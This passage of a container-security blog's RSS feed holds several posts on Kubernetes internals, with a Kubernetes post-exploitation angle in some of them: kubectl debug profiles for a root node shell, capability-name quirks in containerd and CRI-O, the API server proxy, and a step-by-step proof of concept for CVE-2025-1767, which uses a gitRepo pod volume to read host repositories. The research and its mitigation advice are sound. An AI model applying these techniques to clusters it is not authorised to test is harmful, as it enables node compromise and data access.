        SYSLOG SETSID USELIB USTAT SYSFS VHANGUP PIVOT_ROOT _SYSCTL ACCT SETTIMEOFDAY MOUNT UMOUNT2 SWAPON SWAPOFF REBOOT SETHOSTNAME SETDOMAINNAME IOPL IOPERM CREATE_MODULE INIT_MODULE DELETE_MODULE GET_KERNEL_SYMS QUERY_MODULE QUOTACTL NFSSERVCTL GETPMSG PUTPMSG AFS_SYSCALL TUXCALL SECURITY LOOKUP_DCOOKIE CLOCK_SETTIME VSERVER MBIND SET_MEMPOLICY GET_MEMPOLICY KEXEC_LOAD ADD_KEY REQUEST_KEY KEYCTL MIGRATE_PAGES UNSHARE MOVE_PAGES PERF_EVENT_OPEN FANOTIFY_INIT OPEN_BY_HANDLE_AT SETNS KCMP FINIT_MODULE KEXEC_FILE_LOAD BPF USERFAULTFD IO_URING_SETUP IO_URING_ENTER IO_URING_REGISTER OPEN_TREE MOVE_MOUNT FSOPEN FSCONFIG FSMOUNT FSPICK PIDFD_GETFD PROCESS_MADVISE MOUNT_SETATTR QUOTACTL_FD LANDLOCK_RESTRICT_SELF SET_MEMPOLICY_HOME_NODE
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;This one was interesting for a number of reasons. First up was a good reminder that you can’t rely on tools always working the way they used to, as the underlying systems change. The second one was that I learned quite a bit about the limitations of closed box testing of syscalls, and also as a side lesson, the current limitations of LLMs when dealing with relatively obscure lower level tech.&lt;/p&gt;
</description>
				<pubDate>Mon, 09 Jun 2025 10:30:00 +0100</pubDate>
				<link>https://raesene.github.io/blog/2025/06/09/am-i-still-contained/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2025/06/09/am-i-still-contained/</guid>
			</item>
		
			<item>
				<title>Kubernetes Debug Profiles</title>
				<description>&lt;p&gt;I got a lesson today in the idea that it’s always worth re-visiting things you’ve used in the past to see how they’ve changed, as sometimes there will be cool new features!&lt;/p&gt;

&lt;p&gt;In my &lt;a href=&quot;https://youtu.be/4L8Dg_QSx30?si=hwH6LcwvXGCOVkhg&quot;&gt;Kubernetes Post-Exploitation talk&lt;/a&gt; I make use of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl debug&lt;/code&gt; as a means to get a root shell on a cluster node. It’s a very handy command but &lt;em&gt;I thought&lt;/em&gt; it wasn’t possible to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctr&lt;/code&gt; commands from inside the shell you get with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl debug&lt;/code&gt; and that turns out to be outdated information!&lt;/p&gt;

&lt;h2 id=&quot;whats-the-problem&quot;&gt;What’s the problem?&lt;/h2&gt;

&lt;p&gt;If you’ve done much with container pentesting or offensive security, you’ll have come across the idea that access to the Docker socket effectively gives root access to the underlying host via &lt;a href=&quot;https://zwischenzugs.com/2015/06/24/the-most-pointless-docker-command-ever/&quot;&gt;The most pointless Docker command ever&lt;/a&gt;, and this is true even if you just have a container with that file mounted in.&lt;/p&gt;

&lt;p&gt;However in modern Kubernetes clusters, it’s likely that the underlying container runtime is &lt;a href=&quot;https://containerd.io/&quot;&gt;containerd&lt;/a&gt; and not Docker. What can be surprising is that the containerd socket works very differently than the Docker one. It assumes that the client program and the containerd server are operating on the same host with the same environment.&lt;/p&gt;

&lt;h2 id=&quot;old-kubectl-debug&quot;&gt;(old) kubectl debug&lt;/h2&gt;

&lt;p&gt;This problem shows up when using the “legacy” profile for kubectl debug node (which is the default if you don’t specify one).  Some commands, using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctr&lt;/code&gt; client will work just fine, so things like pulling new images, however when you try to run a new container you’ll get an error like this&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ctr: failed to unmount /tmp/containerd-mount2094132404: operation not permitted: failed to mount /tmp/containerd-mount2094132404: operation not permitted
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;kubectl-debug-profiles-to-the-rescue&quot;&gt;Kubectl debug profiles to the rescue!&lt;/h2&gt;

&lt;p&gt;Fortunately Kubernetes SIG-CLI have been improving on the initial kubectl debug command by having a set of profiles that you can specify, which provide different sets of rights on the node you’re debugging. The list of available profiles is “legacy”, “general”, “baseline”, “netadmin”, “restricted” or “sysadmin”, with the default being “legacy”.&lt;/p&gt;

&lt;p&gt;So I decided to try the commands from my demo, but with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sysadmin&lt;/code&gt; profile specified as an option, and it works!&lt;/p&gt;

&lt;p&gt;This is very handy if you’re a sysadmin who wants to interact with the containerd socket as part of your troubleshooting, or if you’re an attacker who’s got access to a host and wants to hide some tools in a containerd container!&lt;/p&gt;

&lt;p&gt;There are some details on what each of the profiles sets in terms of security options in this &lt;a href=&quot;https://github.com/kubernetes/enhancements/tree/master/keps/sig-cli/1441-kubectl-debug#debugging-profiles&quot;&gt;KEP&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;As ever there’s loads of cool new Kubernetes features that come up all the time. I’ve been doing container security things for 9+ years now and I’m still finding interesting things to look at!&lt;/p&gt;
</description>
				<pubDate>Fri, 30 May 2025 17:00:00 +0100</pubDate>
				<link>https://raesene.github.io/blog/2025/05/30/kubernetes-debug-profiles/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2025/05/30/kubernetes-debug-profiles/</guid>
			</item>
		
			<item>
				<title>Cap or no cap</title>
				<description>&lt;p&gt;I was looking at a &lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/131336&quot;&gt;Kubernetes issue&lt;/a&gt; the other day and it led me down a kind of interesting rabbit hole, so I thought it’d be worth sharing as I learned a couple of things.&lt;/p&gt;

&lt;h2 id=&quot;background&quot;&gt;Background&lt;/h2&gt;

&lt;p&gt;The issue is to do with the interaction of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allowPrivilegeEscalation&lt;/code&gt; and added capabilities in a Kubernetes workload specification. In the issue the reporter noted that if you add &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_SYS_ADMIN&lt;/code&gt; to a manifest while setting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allowPrivilegeEscalation: false&lt;/code&gt; it blocks the deploy but other capabilities when added do not block.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allowPrivilegeEscalation&lt;/code&gt; is kind of an interesting flag as it doesn’t really do what the name says. In reality, what it does is set a specific Linux Kernel setting designed to stop a process from getting more privileges than when it started, however the name implies it’s intended to do a more wide ranging set of blocks. My colleague Christophe has a &lt;a href=&quot;https://blog.christophetd.fr/stop-worrying-about-allowprivilegeescalation/&quot;&gt;detailed post looking at this misunderstanding&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;However what was specifically interesting to me was, when I tried out a quick manifest to re-create the problem, I wasn’t able to and the pod I created was admitted ok.&lt;/p&gt;

&lt;p&gt;After a bit of looking I realised that when adding the capability, I’d used the name &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_ADMIN&lt;/code&gt; instead of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_SYS_ADMIN&lt;/code&gt;, and it had worked fine, weird!&lt;/p&gt;

&lt;h2 id=&quot;exploring-whats-going-on&quot;&gt;Exploring what’s going on&lt;/h2&gt;

&lt;p&gt;I decided to put together a couple of quick test cases to understand what’s happening (manifests are &lt;a href=&quot;https://github.com/raesene/k8sapecsa&quot;&gt;here&lt;/a&gt;).&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;capsysadminpod.yaml&lt;/code&gt; - This pod adds &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_SYS_ADMIN&lt;/code&gt; to the capabilities list&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sysadminpod.yaml&lt;/code&gt; - This pod adds &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_ADMIN&lt;/code&gt; to the capabilities list&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dontallowprivesccapsysadminpod.yaml&lt;/code&gt; - This has &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allowPrivilegeEscalation: false&lt;/code&gt; set and adds &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_SYS_ADMIN&lt;/code&gt; to the capabilities list&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dontallowprivescsysadminpod.yaml&lt;/code&gt; - This has &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allowPrivilegeEscalation: false&lt;/code&gt; set and adds &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_ADMIN&lt;/code&gt; to the capabilities list&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;invalidcap.yaml&lt;/code&gt; - This pod has an invalid capability (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LOREM&lt;/code&gt;) set.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Trying these manifests out in a &lt;a href=&quot;https://kind.sigs.k8s.io/&quot;&gt;kind&lt;/a&gt; cluster (using containerd as CRI) showed a couple of things&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Adding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_SYS_ADMIN&lt;/code&gt; worked but there was no capability added.&lt;/li&gt;
  &lt;li&gt;Adding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_ADMIN&lt;/code&gt; worked and the capability was added.&lt;/li&gt;
  &lt;li&gt;setting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allowPrivilegeEscalation: false&lt;/code&gt; and adding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_SYS_ADMIN&lt;/code&gt; was blocked&lt;/li&gt;
  &lt;li&gt;setting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allowPrivilegeEscalation: false&lt;/code&gt; and adding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_ADMIN&lt;/code&gt; was allowed and the capability was added.&lt;/li&gt;
  &lt;li&gt;setting an invalid capability worked ok but no capability was added.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So a couple of lessons from that. Kubernetes does not check what capabilities you add, and no error is generated if you add an invalid one, it just doesn’t do anything. Also there’s a redundant block in Kubernetes at the moment where something that doesn’t do anything is blocked, but something which does do something is allowed ok…&lt;/p&gt;

&lt;p&gt;Doing some more searching on Github turned up some more history on this. Back in 2021, there was a &lt;a href=&quot;https://github.com/kubernetes/kubernetes/pull/105237&quot;&gt;PR to try and fix this&lt;/a&gt; which didn’t get merged, and there’s another &lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/119568&quot;&gt;issue from 2023&lt;/a&gt; on it as well.&lt;/p&gt;

&lt;p&gt;From that one thing that caught my eye was that apparently CRI-O handles this differently than containerd, which I thought was interesting&lt;/p&gt;

&lt;h2 id=&quot;comparing-cri-o---with-iximiuz-labs&quot;&gt;Comparing CRI-O - with iximiuz labs&lt;/h2&gt;

&lt;p&gt;I wanted to test out this difference in behaviour, but unfortunately I don’t have a CRI-O backed cluster available on my test lab. Fortunately, iximiuz labs has an awesome &lt;a href=&quot;https://labs.iximiuz.com/playgrounds/k8s-omni&quot;&gt;Kubernetes playground&lt;/a&gt; where you can specify various combinations of CRI and CNI to test out different scenarios, which is nice!&lt;/p&gt;

&lt;p&gt;Testing out a cluster there with CRI-O confirmed that things are handled rather differently.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Adding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_SYS_ADMIN&lt;/code&gt; worked and the capability was added.&lt;/li&gt;
  &lt;li&gt;Adding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_ADMIN&lt;/code&gt; worked and the capability was added.&lt;/li&gt;
  &lt;li&gt;setting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allowPrivilegeEscalation: false&lt;/code&gt; and adding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_SYS_ADMIN&lt;/code&gt; was blocked&lt;/li&gt;
  &lt;li&gt;setting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allowPrivilegeEscalation: false&lt;/code&gt; and adding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_ADMIN&lt;/code&gt; was allowed and the capability was added.&lt;/li&gt;
  &lt;li&gt;setting an invalid capability resulted in an error on container creation (CRI-O prepended the capability set with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_&lt;/code&gt; and then threw an error stopping pod creation as it was invalid).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So we can see that CRI-O handles things a bit differently, allowing both &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_ADMIN&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_SYS_ADMIN&lt;/code&gt; to work and erroring out on invalid capabilities!&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Sometimes we can assume that Kubernetes clusters will work the same way, so we can freely move workloads from one to another, regardless of distribution. This case provides an illustration of one way that that assumption might not hold up, and we can see some surprising results!&lt;/p&gt;
</description>
				<pubDate>Wed, 23 Apr 2025 11:00:00 +0100</pubDate>
				<link>https://raesene.github.io/blog/2025/04/23/cap-or-no-cap/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2025/04/23/cap-or-no-cap/</guid>
			</item>
		
			<item>
				<title>CVE-2025-1767 - Another gitrepo issue</title>
				<description>&lt;p&gt;There’s a new Kubernetes security vulnerability that’s just been disclosed and I thought it was worth taking a look at it, as there’s a couple of interesting aspects to it. &lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/130786&quot;&gt;CVE-2025-1767&lt;/a&gt; exists in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitRepo&lt;/code&gt; volume type and can allow users who can create pods with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitRepo&lt;/code&gt; volumes to get access to any other git repository on the node where the pod is deployed. This is the second recent CVE related to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitRepo&lt;/code&gt; volumes, I covered the last one &lt;a href=&quot;https://raesene.github.io/blog/2024/07/10/Fun-With-GitRepo-Volumes/&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;vulnerability-and-exploitation&quot;&gt;Vulnerability and Exploitation&lt;/h2&gt;

&lt;p&gt;So setting this up is relatively straightforward. Our node OS has to have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git&lt;/code&gt; installed, which is common but not the case in every distribution, and we need to be able to create pods on that node. With those two pre-requisites in place, we can show how to exploit it.&lt;/p&gt;

&lt;p&gt;I’m going to use a &lt;a href=&quot;https://kind.sigs.k8s.io/&quot;&gt;kind cluster&lt;/a&gt; , so first step is to shell into the cluster and install git, as it’s not included with kind.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kind create cluster
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker exec -it kind-control-plane bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt update &amp;amp;&amp;amp; apt install -y git
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Next we need a “victim” git repository, for this I’ll just clone down &lt;a href=&quot;https://github.com/raesene/TestingScripts/&quot;&gt;one of my repositories&lt;/a&gt; into the root of the node’s filesystem.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/raesene/TestingScripts/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With that setup done, exit the node shell, and then we can create our “exploit” pod. This is pretty straightforward, all we need is a pod with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitRepo&lt;/code&gt; volume and we specify the repository to pull into the pod using a file path. As the plugin is just running git on the host, it can access that directory just fine and pull it into the pod.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;v1&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Pod&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;git-repo-pod-test&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;spec&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;containers&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;git-repo-test-container&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;raesene/alpine-containertools&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;volumeMounts&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;git-volume&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;mountPath&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/tmp&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;volumes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;git-volume&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;gitRepo&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;repository&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/TestingScripts&quot;&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;directory&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;.&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can then save this as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitrepotest.yaml&lt;/code&gt; and apply it to the cluster with&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubectl create -f gitrepotest.yaml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If all works ok, it should be possible to check that the repository has been cloned from the node into the pod&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubectl exec git-repo-pod-test -- ls /tmp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This will show the files from the cloned repository!&lt;/p&gt;

&lt;h2 id=&quot;impact--exploitability&quot;&gt;Impact &amp;amp; Exploitability&lt;/h2&gt;

&lt;p&gt;So that’s how it works, is it really a problem? My feeling is that this is quite a situational vulnerability. Essentially the attacker needs to know the path to a git repository on the node, and for it to contain files that they should not have access to. That’s not going to be be every cluster for sure, but there are times when you could see this causing problems&lt;/p&gt;

&lt;h2 id=&quot;patching--mitigation&quot;&gt;Patching &amp;amp; Mitigation&lt;/h2&gt;

&lt;p&gt;The patching situation for this vulnerability is interesting. The CVE description says that a patch will not be provided as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitRepo&lt;/code&gt; volumes are deprecated, which is true. However, this volume type is enabled by Kubernetes by default and there is no flag or switch that would allow a cluster operator to disable it.&lt;/p&gt;

&lt;p&gt;There has been an &lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/125983&quot;&gt;ongoing discussion&lt;/a&gt; on disabling and/or removing this volume type since the &lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/128885&quot;&gt;last CVE&lt;/a&gt; affecting this component, but a decision hasn’t currently been made on its removal.&lt;/p&gt;

&lt;p&gt;In practice, if you don’t use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitRepo&lt;/code&gt; volumes, you can mitigate this in a couple of ways. If you don’t need &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git&lt;/code&gt; on your nodes you can just remove it there (assuming un-managed Kubernetes of course), and you can also block the use of these volumes using &lt;a href=&quot;https://kubernetes.io/docs/reference/access-authn-authz/validating-admission-policy/&quot;&gt;Validating Admission Policy&lt;/a&gt; or similar admission controllers. There’s some details in the CVE announcement of a policy that could be used.&lt;/p&gt;

&lt;p&gt;One downside that you may encounter here is that I’d imagine that CVE scanners will pick up this vulnerability and as they can’t easily detect the mitigations, and as there are no patches available and all Kubernetes versions are affected, I’d expect this to flag a lot of Kubernetes installations as vulnerable.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Whilst this is a bit of a situational vulnerability, it’s an interesting illustration of how some less well known components of Kubernetes can affect its security.&lt;/p&gt;
</description>
				<pubDate>Fri, 14 Mar 2025 10:00:00 +0000</pubDate>
				<link>https://raesene.github.io/blog/2025/03/14/cve-2025-1767-another-gitrepo-issue/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2025/03/14/cve-2025-1767-another-gitrepo-issue/</guid>
			</item>
		
			<item>
				<title>Exploring the Kubernetes API Server Proxy</title>
				<description>&lt;p&gt;For my first post of the year I thought it’d be interesting to look at a lesser known feature of the Kubernetes API server which has some interesting security implications.&lt;/p&gt;

&lt;p&gt;The Kubernetes API server can act as an HTTP proxy server, allowing users with the right access to get to applications they might otherwise not be able to reach. This is one of a number of proxies in the Kubernetes world (detailed &lt;a href=&quot;https://kubernetes.io/docs/concepts/cluster-administration/proxies/&quot;&gt;here&lt;/a&gt;) which serve different purposes. The proxy can be used to access pods, services, and nodes in the cluster, we’ll focus on pods and nodes for this post.&lt;/p&gt;

&lt;h2 id=&quot;how-does-it-work&quot;&gt;How does it work?&lt;/h2&gt;

&lt;p&gt;Let’s demonstrate how this works with a &lt;a href=&quot;https://kind.sigs.k8s.io/&quot;&gt;KinD&lt;/a&gt; cluster and some pods. With a standard kind cluster spun up using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kind create cluster&lt;/code&gt; we can start an echo server so it’ll show us what we’re sending&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubectl run echoserver &lt;span class=&quot;nt&quot;&gt;--image&lt;/span&gt; gcr.io/google_containers/echoserver:1.10
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Next (just to make things a bit more complex) we’ll start the &lt;a href=&quot;https://kubernetes.io/docs/tasks/access-application-cluster/access-cluster/#directly-accessing-the-rest-api&quot;&gt;kubectl proxy&lt;/a&gt; on our client to let us send curl requests to the API server more easily&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubectl proxy
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With that all in place we can use a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; request from our client to access the echoserver pod via the API server proxy&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://127.0.0.1:8001/api/v1/namespaces/default/pods/echoserver:8080/proxy/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And you should get a response that looks a bit like this&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Request Information:
        client_address=10.244.0.1
        method=GET
        real path=/
        query=
        request_version=1.1
        request_scheme=http
        request_uri=http://127.0.0.1:8080/

Request Headers:
        accept=*/*
        accept-encoding=gzip
        host=127.0.0.1:45745
        user-agent=curl/8.5.0
        x-forwarded-for=127.0.0.1, 172.18.0.1
        x-forwarded-uri=/api/v1/namespaces/default/pods/echoserver:8080/proxy/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Looking at the response from the echo server we can see some interesting items. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client_address&lt;/code&gt; is the API servers address on the pod network, and we can also see the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x-forwarded-for&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x-forwarded-uri&lt;/code&gt; headers are set too.&lt;/p&gt;

&lt;p&gt;Graphically the set of connections look a bit like this&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/kube-api-proxy.png&quot; alt=&quot;API Server Proxy&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In terms of how this feature works, one interesting point to note here is that it’s possible to specify the port that we’re using, so the API server proxy can be used to get to any port.&lt;/p&gt;

&lt;p&gt;We can also put in anything that works in a curl request and it will be relayed onwards to the proxy targets, so POST requests, headers with tokens or anything else that’s valid in curl, which makes this pretty powerful.&lt;/p&gt;

&lt;p&gt;It’s not just pods that we can proxy to, we can also get to any service running on a node (with an exception we’ll mention in a bit). So for example with our kind cluster setup, we can issue a curl command like&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://127.0.0.1:8001/api/v1/nodes/http:kind-control-plane:10256/proxy/healthz
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and we get back the kube-proxy’s healthz endpoint information&lt;/p&gt;

